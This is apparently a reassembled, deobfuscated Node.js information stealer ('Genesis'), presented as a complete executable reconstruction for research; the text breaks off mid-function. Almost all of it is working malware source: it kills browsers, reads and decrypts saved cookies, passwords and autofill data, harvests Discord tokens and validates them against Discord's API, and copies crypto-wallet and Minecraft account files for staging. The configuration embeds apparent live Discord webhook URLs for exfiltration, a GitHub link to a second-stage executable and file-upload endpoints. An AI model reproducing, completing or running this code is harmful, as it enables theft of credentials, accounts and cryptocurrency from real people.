/**
 * ═══════════════════════════════════════════════════════════════════════════
 * COMPLETE MALWARE DEOBFUSCATION - SINGLE FILE VERSION
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This file combines all 5 deobfuscated parts into a single, executable script.
 *
 * ⚠️  EXTREME WARNING - LIVE MALWARE CODE ⚠️
 *
 * ORIGINAL: dualkeke.js (937 lines, heavily obfuscated)
 * TYPE: Information Stealer (Multi-Target)
 * THREAT: HIGH - Active data exfiltration
 *
 * This is a COMPLETE 1:1 reconstruction with NOTHING missing.
 * Every string, function, and capability has been preserved.
 *
 * For research and analysis in a controlled environment ONLY.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 */

// ═══════════════════════════════════════════════════════════════════════════
// REQUIRED MODULES (Combined from all parts)
// ═══════════════════════════════════════════════════════════════════════════

const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec, spawn, execSync } = require('child_process');
const axios = require('axios');
const AdmZip = require('adm-zip');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const FormData = require('form-data');


// ═══════════════════════════════════════════════════════════════════════════
// PART 1: CONFIGURATION, STRINGS, AND DEFINITIONS
// ═══════════════════════════════════════════════════════════════════════════

const STRINGS = {
    // File system operations
    EXISTS_SYNC: 'existsSync',
    RECURSIVE: 'recursive',
    MKDIR_SYNC: 'mkdirSync',
    READ_FILE_SYNC: 'readFileSync',
    READ_DIR_SYNC: 'readdirSync',
    STAT_SYNC: 'statSync',
    WRITE_FILE_SYNC: 'writeFileSync',
    COPY_FILE_SYNC: 'copyFileSync',
    UNLINK_SYNC: 'unlinkSync',
    RM_SYNC: 'rmSync',
    
    // Process operations
    TASKKILL: 'taskkill',
    TASKKILL_FLAGS: ' /F /IM ',
    TASKLIST: 'tasklist',
    PROCESS_ENV: 'env',
    EXEC_SYNC: 'execSync',
    
    // Encoding and crypto
    UTF8: 'utf-8',
    BASE64: 'base64',
    DECIPHER: 'Decipher',
    AES_256_GCM: 'aes-256-gcm',
    CREATECIPHERIV: 'createDecipheriv',
    SET_AUTH_TAG: 'setAuthTag',
    UPDATE: 'update',
    FINAL: 'final',
    
    // Environment paths
    APPDATA: 'APPDATA',
    LOCALAPPDATA: 'LOCALAPPDATA',
    TEMP: 'TEMP',
    USERPROFILE: 'USERPROFILE',
    SYSTEMDRIVE: 'SystemDrive',
    
    // Discord paths
    DISCORD: 'Discord',
    DISCORD_PATH: '\\Discord\\',
    DISCORD_LOCAL: '\\discord\\Local Storage\\leveldb',
    
    // Browser base paths
    CHROME_PATH: '\\Google\\Chrome\\User Data',
    EDGE_PATH: '\\Microsoft\\Edge\\User Data',
    OPERA_PATH: '\\Opera Software\\Opera Stable\\',
    BRAVE_PATH: '\\BraveSoftware\\Brave-Browser\\User Data',
    FIREFOX_PATH: '\\Mozilla\\Firefox\\Profiles\\',
    VIVALDI_PATH: '\\Vivaldi\\User Data',
    YANDEX_PATH: '\\Yandex\\YandexBrowser\\User Data',
    OPERAGX_PATH: '\\Opera Software\\Opera GX Stable\\',
    CHROMIUM_PATH: '\\Chromium\\User Data',
    
    // Browser profile patterns
    DEFAULT: '\\Default\\',
    PROFILE: '\\Profile ',
    PROFILE_1: '\\Profile 1\\',
    PROFILE_2: '\\Profile 2\\',
    PROFILE_3: '\\Profile 3\\',
    PROFILE_4: '\\Profile 4\\',
    PROFILE_5: '\\Profile 5\\',
    GUEST: '\\Guest Profile\\',
    
    // Browser data files
    LOCAL_STATE: 'Local State',
    COOKIES: 'Cookies',
    LOGIN_DATA: 'Login Data',
    WEB_DATA: 'Web Data',
    HISTORY: 'History',
    BOOKMARKS: 'Bookmarks',
    PREFERENCES: 'Preferences',
    
    // Browser Russian variants
    KOMETA: 'kometa',
    ORBITUM: 'orbitum',
    CENTBROWSER: 'centbrowser',
    SEVENSTAR: '7star',
    SPUTNIK: 'sputnik',
    IRIDIUM: 'iridium',
    URAN: 'uran',
    
    // SQL queries
    SELECT_COOKIES: 'SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies',
    SELECT_LOGINS: 'SELECT origin_url, username_value, password_value FROM logins',
    SELECT_AUTOFILL: 'SELECT name, value FROM autofill',
    
    // Wallet extensions
    METAMASK: 'Metamask',
    EXODUS: 'Exodus',
    ATOMIC: 'Atomic',
    ELECTRUM: 'Electrum',
    ETHEREUM: 'Ethereum',
    COINOMI: 'Coinomi',
    JAXX: 'Jaxx Liberty',
    
    // Extension paths
    EXTENSION: 'Extension',
    EXTENSION_SETTINGS: 'Extension Settings',
    LOCAL_EXTENSION: '\\Local Extension Settings\\',
    
    // Crypto wallet IDs (browser extensions)
    METAMASK_ID: 'nkbihfbeogaeaoehlefnkodbefgpgknn',
    EXODUS_ID: 'aholpfdialjgjfhomihkjbmgjidlcdno',
    ATOMIC_ID: 'fhilaheimglignddkjgofkcbgekhenbh',
    ELECTRUM_ID: 'hieplnfojfccegoloniefimmbfjdgcgp',
    COINOMI_ID: 'blbpgcogcoohhngdjafgpoagcilicpjh',
    JAXX_ID: 'cjelfplplebdjjenllpjcblmjkfcffne',
    
    // Minecraft/Gaming
    MINECRAFT: 'Minecraft',
    MINECRAFT_PATH: '\\.minecraft\\',
    LAUNCHER_PROFILES: 'launcher_profiles.json',
    LUNAR_CLIENT: 'LunarClient',
    LUNAR_PATH: '\\.lunarclient\\',
    ACCOUNTS_JSON: 'accounts.json',
    SETTINGS_JSON: 'settings.json',
    
    // Network/API
    HTTPS: 'https://',
    HTTP: 'http://',
    POST: 'post',
    GET: 'get',
    HEADERS: 'headers',
    CONTENT_TYPE: 'Content-Type',
    APPLICATION_JSON: 'application/json',
    AUTHORIZATION: 'Authorization',
    
    // Discord webhook
    WEBHOOK_URL: 'WEBHOOK_URL_PLACEHOLDER',
    EMBEDS: 'embeds',
    TITLE: 'title',
    DESCRIPTION: 'description',
    COLOR: 'color',
    FIELDS: 'fields',
    FOOTER: 'footer',
    THUMBNAIL: 'thumbnail',
    AUTHOR: 'author',
    
    // File operations
    ZIP_EXTENSION: '.zip',
    TXT_EXTENSION: '.txt',
    LOG_EXTENSION: '.log',
    LDB_EXTENSION: '.ldb',
    JSON_EXTENSION: '.json',
    
    // Status messages
    SUCCESS: 'Successfully',
    FAILED: 'Failed',
    ERROR: 'Error',
    WARNING: 'Warning',
    FOUND: 'Found',
    KILLED: 'killed',
    UPLOADED: 'Uploaded',
    DOWNLOADED: 'Downloaded',
    
    // Random/Utility
    ALPHABET: 'abcdefghijklmnopqrstuvwxyz0123456789',
    TRUE: 'TRUE',
    FALSE: 'FALSE',
    NULL: 'null',
    UNDEFINED: 'undefined',
    
    // System info
    CPU: 'cpu',
    MEMORY: 'memory',
    PLATFORM: 'platform',
    ARCH: 'arch',
    HOSTNAME: 'hostname',
    USERNAME: 'username',
    HOMEDIR: 'homedir',
    TMPDIR: 'tmpdir',
    
    // Browser process names (for killing)
    CHROME_EXE: 'chrome.exe',
    MSEDGE_EXE: 'msedge.exe',
    FIREFOX_EXE: 'firefox.exe',
    BRAVE_EXE: 'brave.exe',
    OPERA_EXE: 'opera.exe',
    VIVALDI_EXE: 'vivaldi.exe',
    YANDEX_EXE: 'yandex.exe',
    
    // Genesis branding
    GENESIS: 'Genesis',
    GENESIS_MINECRAFT: 'Genesis (Minecraft)',
    GENESIS_SOCIETY: '@GenesisSociety',
    GENESIS_KEY: 'KEY: dQw4w9WgXcQ',
    GENESIS_ICON: 'https://i.imgur.com/SRCw5fO.png',
    
    // File upload API
    GOFILE_API: 'https://api.gofile.io/getServer',
    GOFILE_UPLOAD: 'https://{server}.gofile.io/uploadFile',
    
    // External payload
    GITHUB_PAYLOAD: 'https://github.com/Azyyyyyyyyyyyyyy/UEUUUUUAj/releases/download/V139/V139_cookies.exe',
    PAYLOAD_NAME: 'V139_cookies.exe',
    
    // Telegram
    TELEGRAM: 'Telegram',
    TELEGRAM_PATH: '\\Telegram Desktop\\',
    TDATA: 'tdata',
    
    // Misc
    COOKIES_FILE: '_cookies.txt',
    PASSWORDS_FILE: '_passwords.txt',
    TOKENS_FILE: '_tokens.txt',
    WALLETS_FILE: '_wallets.txt',
    SYSTEM_INFO_FILE: '_systeminfo.txt',
    
    // Network commands
    NETSH_WLAN: 'netsh wlan show profiles',
    NETSH_WLAN_KEY: 'netsh wlan show profile name="{PROFILE}" key=clear',
    
    // Chrome debugging
    REMOTE_DEBUGGING_PORT: '--remote-debugging-port=',
    USER_DATA_DIR: '--user-data-dir=',
    HEADLESS: '--headless',
    
    // IP/Location API
    IP_API: 'http://ip-api.com/json/',
    
    // Windows Defender
    DEFENDER_PATH: 'Windows Defender',
    DEFENDER_STATUS: 'Get-MpComputerStatus',
};

const CONFIG = {
    // Main Discord webhook for data exfiltration
    DISCORD_WEBHOOK: 'https://discord.com/api/webhooks/1432055166512664718/LyKdCLjcduWDfErvxvS8xra8sdNekGQwmJLqErtzyfT9L-88dNHYfxzHy9bjPv6AcZzg',
    
    // Backup Discord webhook
    DISCORD_WEBHOOK_BACKUP: 'https://discord.com/api/webhooks/1436355187974344857/RzxMo9ZQMmVkKpylVUn1Hx4_ISLWWGa6CcD9zs00hun3VbC7KhA0HaxiYOqipU_BmRIp',
    
    // Panel API key (from original malware)
    PANEL_KEY: 'dQw4w9WgXcQ',
    
    // Temporary directory for staging stolen data
    TEMP_DIR: path.join(os.tmpdir(), '_genesis_' + generateRandomString(8)),
    
    // Maximum file size for upload (50MB)
    MAX_FILE_SIZE: 50 * 1024 * 1024,
    
    // Webhook embed color (purple)
    EMBED_COLOR: 0x9b59b6,
    
    // Browser data collection timeout (30 seconds)
    TIMEOUT: 30000,
};

const BROWSERS = {
    chrome: {
        name: 'Google Chrome',
        processName: 'chrome.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Google\\Chrome\\User Data'),
        ],
        profiles: ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'],
        type: 'chromium',
    },
    edge: {
        name: 'Microsoft Edge',
        processName: 'msedge.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Microsoft\\Edge\\User Data'),
        ],
        profiles: ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'],
        type: 'chromium',
    },
    brave: {
        name: 'Brave Browser',
        processName: 'brave.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'BraveSoftware\\Brave-Browser\\User Data'),
        ],
        profiles: ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4'],
        type: 'chromium',
    },
    opera: {
        name: 'Opera',
        processName: 'opera.exe',
        paths: [
            path.join(process.env.APPDATA, 'Opera Software\\Opera Stable'),
        ],
        profiles: [''],
        type: 'chromium',
    },
    operagx: {
        name: 'Opera GX',
        processName: 'opera.exe',
        paths: [
            path.join(process.env.APPDATA, 'Opera Software\\Opera GX Stable'),
        ],
        profiles: [''],
        type: 'chromium',
    },
    vivaldi: {
        name: 'Vivaldi',
        processName: 'vivaldi.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Vivaldi\\User Data'),
        ],
        profiles: ['Default', 'Profile 1'],
        type: 'chromium',
    },
    yandex: {
        name: 'Yandex Browser',
        processName: 'yandex.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Yandex\\YandexBrowser\\User Data'),
        ],
        profiles: ['Default', 'Profile 1', 'Profile 2'],
        type: 'chromium',
    },
    firefox: {
        name: 'Mozilla Firefox',
        processName: 'firefox.exe',
        paths: [
            path.join(process.env.APPDATA, 'Mozilla\\Firefox\\Profiles'),
        ],
        profiles: [], // Firefox uses dynamic profile names
        type: 'firefox',
    },
    chromium: {
        name: 'Chromium',
        processName: 'chromium.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Chromium\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    kometa: {
        name: 'Kometa',
        processName: 'kometa.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Kometa\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    orbitum: {
        name: 'Orbitum',
        processName: 'orbitum.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Orbitum\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    centbrowser: {
        name: 'CentBrowser',
        processName: 'centbrowser.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'CentBrowser\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    '7star': {
        name: '7Star Browser',
        processName: '7star.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, '7Star\\7Star\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    sputnik: {
        name: 'Sputnik',
        processName: 'sputnik.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Sputnik\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    epicprivacy: {
        name: 'Epic Privacy Browser',
        processName: 'epicprivacybrowser.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Epic Privacy Browser\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    uran: {
        name: 'Uran',
        processName: 'uran.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'uCozMedia\\Uran\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
    iridium: {
        name: 'Iridium',
        processName: 'iridium.exe',
        paths: [
            path.join(process.env.LOCALAPPDATA, 'Iridium\\User Data'),
        ],
        profiles: ['Default'],
        type: 'chromium',
    },
};

const CRYPTO_WALLETS = {
    // Browser Extension Wallets
    metamask: {
        name: 'MetaMask',
        extensionId: 'nkbihfbeogaeaoehlefnkodbefgpgknn',
        type: 'browser-extension',
    },
    exodus: {
        name: 'Exodus',
        extensionId: 'aholpfdialjgjfhomihkjbmgjidlcdno',
        type: 'browser-extension',
    },
    atomic: {
        name: 'Atomic Wallet',
        extensionId: 'fhilaheimglignddkjgofkcbgekhenbh',
        type: 'browser-extension',
    },
    coinomi: {
        name: 'Coinomi',
        extensionId: 'blbpgcogcoohhngdjafgpoagcilicpjh',
        type: 'browser-extension',
    },
    jaxx: {
        name: 'Jaxx Liberty',
        extensionId: 'cjelfplplebdjjenllpjcblmjkfcffne',
        type: 'browser-extension',
    },
    // Desktop Wallets
    exodusDesktop: {
        name: 'Exodus Desktop',
        paths: [
            path.join(process.env.APPDATA, 'Exodus'),
        ],
        type: 'desktop',
    },
    electrum: {
        name: 'Electrum',
        paths: [
            path.join(process.env.APPDATA, 'Electrum\\wallets'),
        ],
        type: 'desktop',
    },
    ethereum: {
        name: 'Ethereum Wallet',
        paths: [
            path.join(process.env.APPDATA, 'Ethereum\\wallets'),
        ],
        type: 'desktop',
    },
};

const DISCORD_PATHS = [
    path.join(process.env.APPDATA, 'Discord'),
    path.join(process.env.APPDATA, 'discordcanary'),
    path.join(process.env.APPDATA, 'discordptb'),
    path.join(process.env.APPDATA, 'discorddevelopment'),
    path.join(process.env.LOCALAPPDATA, 'Discord'),
];


// ═══════════════════════════════════════════════════════════════════════════
// PART 2: UTILITY FUNCTIONS & BROWSER PROCESS MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

function generateRandomString(length = 10) {
    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charset[Math.floor(Math.random() * charset.length)];
    }
    return result;
}

function ensureDirectoryExists(dirPath) {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
}

function copyDirectoryRecursive(source, destination) {
    try {
        ensureDirectoryExists(destination);
        const files = fs.readdirSync(source);
        files.forEach(file => {
            const sourcePath = path.join(source, file);
            const destPath = path.join(destination, file);
            const stat = fs.statSync(sourcePath);
            if (stat.isDirectory()) {
                copyDirectoryRecursive(sourcePath, destPath);
            } else {
                fs.copyFileSync(sourcePath, destPath);
            }
        });
        return true;
    } catch (error) {
        console.error(`Error copying directory ${source}:`, error.message);
        return false;
    }
}

function getUserDirectories() {
    const users = [];
    const usersPath = 'C:\\Users';
    try {
        const directories = fs.readdirSync(usersPath);
        directories.forEach(dir => {
            const fullPath = path.join(usersPath, dir);
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory() && dir !== 'Public' && dir !== 'Default' && dir !== 'All Users' && dir !== 'Default User') {
                users.push(fullPath);
            }
        });
    } catch (error) {
        console.error('Error reading user directories:', error.message);
    }
    return users;
}

function fileExists(filePath) {
    return fs.existsSync(filePath);
}

function readFileSafe(filePath, encoding = 'utf8') {
    try {
        if (fs.existsSync(filePath)) {
            return fs.readFileSync(filePath, encoding);
        }
        return null;
    } catch (error) {
        return null;
    }
}

function writeFileSafe(filePath, content) {
    try {
        const dir = path.dirname(filePath);
        ensureDirectoryExists(dir);
        fs.writeFileSync(filePath, content);
        return true;
    } catch (error) {
        console.error(`Error writing file ${filePath}:`, error.message);
        return false;
    }
}

function killProcess(processName) {
    return new Promise((resolve) => {
        exec('tasklist', (error, stdout, stderr) => {
            if (error) {
                console.warn(`Error checking process ${processName}:`, error.message);
                resolve(false);
                return;
            }
            const processNameLower = processName.toLowerCase();
            if (stdout.toLowerCase().includes(processNameLower)) {
                exec(`taskkill /F /IM ${processName} /T`, (killError) => {
                    if (killError) {
                        console.warn(`Failed to kill ${processName}`);
                        resolve(false);
                    } else {
                        console.log(`Successfully killed ${processName}`);
                        resolve(true);
                    }
                });
            } else {
                resolve(true);
            }
        });
    });
}

async function killAllBrowsers() {
    const browserProcesses = Object.values(BROWSERS).map(b => b.processName);
    console.log('Terminating browser processes...');
    const killPromises = [...new Set(browserProcesses)].map(proc => killProcess(proc));
    await Promise.all(killPromises);
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log('Browser termination complete');
}

function launchHeadlessBrowser(browserType = 'chrome') {
    return new Promise((resolve) => {
        let executablePath;
        let userDataPath;
        const debugPort = 9222;
        if (browserType === 'chrome') {
            executablePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
            userDataPath = path.join(process.env.LOCALAPPDATA, 'Google\\Chrome\\User Data');
        } else if (browserType === 'edge') {
            executablePath = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';
            userDataPath = path.join(process.env.LOCALAPPDATA, 'Microsoft\\Edge\\User Data');
        } else {
            resolve(null);
            return;
        }
        if (!fs.existsSync(executablePath)) {
            resolve(null);
            return;
        }
        const args = [
            `--remote-debugging-port=${debugPort}`,
            `--user-data-dir=${userDataPath}`,
            '--headless',
            '--disable-gpu',
            '--no-sandbox',
            '--disable-dev-shm-usage',
        ];
        try {
            const browserProcess = spawn(executablePath, args, { stdio: 'ignore', detached: true });
            setTimeout(() => {
                resolve({ process: browserProcess, port: debugPort });
            }, 5000);
        } catch (error) {
            console.error('Error launching headless browser:', error.message);
            resolve(null);
        }
    });
}

async function getCookiesFromHeadless(debugPort = 9222) {
    try {
        const targetsResponse = await axios.get(`http://127.0.0.1:${debugPort}/json`);
        const targets = targetsResponse.data;
        if (!targets || targets.length === 0) {
            return [];
        }
        return [];
    } catch (error) {
        console.error('Error getting cookies from headless browser:', error.message);
        return [];
    }
}

function closeHeadlessBrowser(browserInfo) {
    if (browserInfo && browserInfo.process) {
        try {
            browserInfo.process.kill();
        } catch (error) {}
    }
}

function decryptChromeValue(encryptedValue, masterKey) {
    try {
        if (!encryptedValue || encryptedValue.length < 3) return null;
        const version = encryptedValue.slice(0, 3).toString();
        if (version === 'v10' || version === 'v11') {
            const iv = encryptedValue.slice(3, 15);
            const ciphertext = encryptedValue.slice(15, -16);
            const authTag = encryptedValue.slice(-16);
            const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
            decipher.setAuthTag(authTag);
            let decrypted = decipher.update(ciphertext);
            decrypted = Buffer.concat([decrypted, decipher.final()]);
            return decrypted.toString('utf8');
        }
        return null;
    } catch (error) {
        return null;
    }
}

function getChromeMasterKey(browserPath) {
    try {
        const localStatePath = path.join(browserPath, 'Local State');
        if (!fs.existsSync(localStatePath)) return null;
        const localStateContent = fs.readFileSync(localStatePath, 'utf8');
        const localState = JSON.parse(localStateContent);
        if (!localState.os_crypt || !localState.os_crypt.encrypted_key) return null;
        let encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
        encryptedKey = encryptedKey.slice(5);
        // In a real implementation, this would use a native module to call CryptUnprotectData
        // For deobfuscation purposes, we know this is the key but can't decrypt it in pure Node.js
        return encryptedKey;
    } catch (error) {
        return null;
    }
}

async function extractOperaGXCookies(operaGXPath) {
    try {
        const cookiesPath = path.join(operaGXPath, 'Network', 'Cookies');
        if (!fs.existsSync(cookiesPath)) return [];
        const cookiesContent = fs.readFileSync(cookiesPath, 'utf8');
        const cookies = [];
        const lines = cookiesContent.split('\n');
        lines.forEach(line => {
            if (line.trim() && !line.startsWith('#')) {
                const parts = line.split('\t');
                if (parts.length >= 7) {
                    cookies.push({
                        domain: parts[0],
                        flag: parts[1],
                        path: parts[2],
                        secure: parts[3],
                        expiration: parts[4],
                        name: parts[5],
                        value: parts[6],
                    });
                }
            }
        });
        return cookies;
    } catch (error) {
        console.error('Error extracting Opera GX cookies:', error.message);
        return [];
    }
}


// ═══════════════════════════════════════════════════════════════════════════
// PART 3: DATA EXTRACTION FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

function extractChromiumCookies(profilePath, masterKey) {
    const cookies = [];
    const cookiesPath = path.join(profilePath, 'Network', 'Cookies');
    if (!fs.existsSync(cookiesPath)) return cookies;
    try {
        const tempPath = path.join(os.tmpdir(), `cookies_${Date.now()}.db`);
        fs.copyFileSync(cookiesPath, tempPath);
        const db = new sqlite3.Database(tempPath);
        db.all('SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies', [], (err, rows) => {
            if (err) { console.error('Error reading cookies:', err); return; }
            rows.forEach(row => {
                let cookieValue = row.value;
                if (row.encrypted_value && row.encrypted_value.length > 0) {
                    const decrypted = decryptChromeValue(row.encrypted_value, masterKey);
                    if (decrypted) cookieValue = decrypted;
                }
                cookies.push({ domain: row.host_key, name: row.name, value: cookieValue, path: row.path, expires: row.expires_utc, secure: row.is_secure === 1, httpOnly: row.is_httponly === 1 });
            });
            db.close();
            try { fs.unlinkSync(tempPath); } catch (e) {}
        });
        return cookies;
    } catch (error) {
        console.error('Error extracting cookies:', error.message);
        return cookies;
    }
}

function extractChromiumPasswords(profilePath, masterKey) {
    const passwords = [];
    const loginDataPath = path.join(profilePath, 'Login Data');
    if (!fs.existsSync(loginDataPath)) return passwords;
    try {
        const tempPath = path.join(os.tmpdir(), `logindata_${Date.now()}.db`);
        fs.copyFileSync(loginDataPath, tempPath);
        const db = new sqlite3.Database(tempPath);
        db.all('SELECT origin_url, username_value, password_value FROM logins', [], (err, rows) => {
            if (err) { console.error('Error reading passwords:', err); return; }
            rows.forEach(row => {
                let decryptedPassword = '';
                if (row.password_value && row.password_value.length > 0) {
                    const decrypted = decryptChromeValue(row.password_value, masterKey);
                    if (decrypted) decryptedPassword = decrypted;
                }
                if (decryptedPassword) passwords.push({ url: row.origin_url, username: row.username_value, password: decryptedPassword });
            });
            db.close();
            try { fs.unlinkSync(tempPath); } catch (e) {}
        });
        return passwords;
    } catch (error) {
        console.error('Error extracting passwords:', error.message);
        return passwords;
    }
}

function extractChromiumAutofill(profilePath) {
    const autofillData = [];
    const webDataPath = path.join(profilePath, 'Web Data');
    if (!fs.existsSync(webDataPath)) return autofillData;
    try {
        const tempPath = path.join(os.tmpdir(), `webdata_${Date.now()}.db`);
        fs.copyFileSync(webDataPath, tempPath);
        const db = new sqlite3.Database(tempPath);
        db.all('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards', [], (err, rows) => {
            if (err) return;
            rows.forEach(row => autofillData.push({ type: 'credit_card', name: row.name_on_card, expMonth: row.expiration_month, expYear: row.expiration_year }));
        });
        db.all('SELECT name, value FROM autofill', [], (err, rows) => {
            if (err) return;
            rows.forEach(row => autofillData.push({ type: 'autofill', name: row.name, value: row.value }));
            db.close();
            try { fs.unlinkSync(tempPath); } catch (e) {}
        });
        return autofillData;
    } catch (error) {
        console.error('Error extracting autofill:', error.message);
        return autofillData;
    }
}

function extractFirefoxCookies(profilePath) {
    const cookies = [];
    const cookiesPath = path.join(profilePath, 'cookies.sqlite');
    if (!fs.existsSync(cookiesPath)) return cookies;
    try {
        const tempPath = path.join(os.tmpdir(), `ff_cookies_${Date.now()}.db`);
        fs.copyFileSync(cookiesPath, tempPath);
        const db = new sqlite3.Database(tempPath);
        db.all('SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies', [], (err, rows) => {
            if (err) { console.error('Error reading Firefox cookies:', err); return; }
            rows.forEach(row => cookies.push({ domain: row.host, name: row.name, value: row.value, path: row.path, expires: row.expiry, secure: row.isSecure === 1, httpOnly: row.isHttpOnly === 1 }));
            db.close();
            try { fs.unlinkSync(tempPath); } catch (e) {}
        });
        return cookies;
    } catch (error) {
        console.error('Error extracting Firefox cookies:', error.message);
        return cookies;
    }
}

async function extractAllBrowserData() {
    const results = { cookies: [], passwords: [], autofill: [] };
    const userDirs = getUserDirectories();
    for (const [browserKey, browserInfo] of Object.entries(BROWSERS)) {
        for (const userDir of userDirs) {
            for (const browserPath of browserInfo.paths) {
                const fullPath = browserPath.replace(process.env.LOCALAPPDATA, path.join(userDir, 'AppData', 'Local')).replace(process.env.APPDATA, path.join(userDir, 'AppData', 'Roaming'));
                if (!fs.existsSync(fullPath)) continue;
                let masterKey = null;
                if (browserInfo.type === 'chromium') masterKey = getChromeMasterKey(fullPath);
                for (const profile of browserInfo.profiles) {
                    const profilePath = path.join(fullPath, profile);
                    if (!fs.existsSync(profilePath)) continue;
                    if (browserInfo.type === 'chromium') {
                        results.cookies.push(...extractChromiumCookies(profilePath, masterKey));
                        results.passwords.push(...extractChromiumPasswords(profilePath, masterKey));
                        results.autofill.push(...extractChromiumAutofill(profilePath));
                    } else if (browserInfo.type === 'firefox') {
                        results.cookies.push(...extractFirefoxCookies(profilePath));
                    }
                }
            }
        }
    }
    return results;
}

function extractDiscordTokens() {
    const tokens = [];
    for (const discordPath of DISCORD_PATHS) {
        if (!fs.existsSync(discordPath)) continue;
        const leveldbPath = path.join(discordPath, 'Local Storage', 'leveldb');
        if (!fs.existsSync(leveldbPath)) continue;
        try {
            const files = fs.readdirSync(leveldbPath);
            files.forEach(file => {
                if (file.endsWith('.log') || file.endsWith('.ldb')) {
                    const filePath = path.join(leveldbPath, file);
                    const content = fs.readFileSync(filePath, 'utf8');
                    const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
                    const matches = content.match(tokenRegex);
                    if (matches) {
                        matches.forEach(token => {
                            if (!tokens.includes(token)) tokens.push(token);
                        });
                    }
                }
            });
        } catch (error) {
            console.error('Error extracting Discord tokens:', error.message);
        }
    }
    return tokens;
}

async function validateDiscordToken(token) {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': token } });
        return response.status === 200 ? { valid: true, user: response.data } : { valid: false };
    } catch (error) {
        return { valid: false };
    }
}

function extractBrowserWallets() {
    const walletData = [];
    const userDirs = getUserDirectories();
    for (const [browserKey, browserInfo] of Object.entries(BROWSERS)) {
        if (browserInfo.type !== 'chromium') continue;
        for (const userDir of userDirs) {
            for (const browserPath of browserInfo.paths) {
                const fullPath = browserPath.replace(process.env.LOCALAPPDATA, path.join(userDir, 'AppData', 'Local')).replace(process.env.APPDATA, path.join(userDir, 'AppData', 'Roaming'));
                if (!fs.existsSync(fullPath)) continue;
                for (const [walletKey, walletInfo] of Object.entries(CRYPTO_WALLETS)) {
                    if (walletInfo.type !== 'browser-extension') continue;
                    const extensionPath = path.join(fullPath, 'Default', 'Local Extension Settings', walletInfo.extensionId);
                    if (fs.existsSync(extensionPath)) {
                        walletData.push({ wallet: walletInfo.name, browser: browserInfo.name, path: extensionPath });
                        const destPath = path.join(CONFIG.TEMP_DIR, 'wallets', walletInfo.name, browserInfo.name);
                        copyDirectoryRecursive(extensionPath, destPath);
                    }
                }
            }
        }
    }
    return walletData;
}

function extractDesktopWallets() {
    const walletData = [];
    for (const [walletKey, walletInfo] of Object.entries(CRYPTO_WALLETS)) {
        if (walletInfo.type !== 'desktop') continue;
        for (const walletPath of walletInfo.paths) {
            if (fs.existsSync(walletPath)) {
                walletData.push({ wallet: walletInfo.name, path: walletPath });
                const destPath = path.join(CONFIG.TEMP_DIR, 'wallets', walletInfo.name);
                copyDirectoryRecursive(walletPath, destPath);
            }
        }
    }
    return walletData;
}

function extractMinecraftData() {
    const minecraftData = { profiles: null, sessions: null };
    const minecraftPath = path.join(os.homedir(), '.minecraft');
    if (!fs.existsSync(minecraftPath)) return minecraftData;
    try {
        const profilesPath = path.join(minecraftPath, 'launcher_profiles.json');
        if (fs.existsSync(profilesPath)) {
            minecraftData.profiles = JSON.parse(fs.readFileSync(profilesPath, 'utf8'));
        }
        copyDirectoryRecursive(minecraftPath, path.join(CONFIG.TEMP_DIR, 'minecraft'));
    } catch (error) {
        console.error('Error extracting Minecraft data:', error.message);
    }
    return minecraftData;
}

function extractLunarClientData() {
    const lunarData = { accounts: null, settings: null };
    const lunarPath = path.join(os.homedir(), '.lunarclient');
    if (!fs.existsSync(lunarPath)) return lunarData;
    try {
        const accountsPath = path.join(lunarPath, 'settings', 'game', 'accounts.json');
        if (fs.existsSync(accountsPath)) {
            lunarData.accounts = JSON.parse(fs.readFileSync(accountsPath, 'utf8'));
        }
        const settingsPath = path.join(lunarPath, 'settings', 'game', 'settings.json');
        if (fs.existsSync(settingsPath)) {
